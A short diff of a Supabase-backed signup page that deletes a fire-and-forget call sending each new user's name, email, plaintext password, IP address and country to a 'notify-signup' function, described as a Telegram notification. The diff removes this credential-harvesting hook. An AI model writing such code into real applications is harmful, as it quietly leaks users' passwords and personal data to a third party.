@@ -78,10 +78,6 @@ export default function AuthPage() {
       if (data.user) {
         supabase.from('profiles').update({ country } as any).eq('user_id', data.user.id).then(() => {});
       }
-      // Send Telegram notification (fire-and-forget)
-      supabase.functions.invoke('notify-signup', {
-        body: { full_name: fullName, email, password, client_ip: clientIp, country },
-      }).catch(() => {});
 
       if (data.session) {
         toast.success('Account created successfully!');
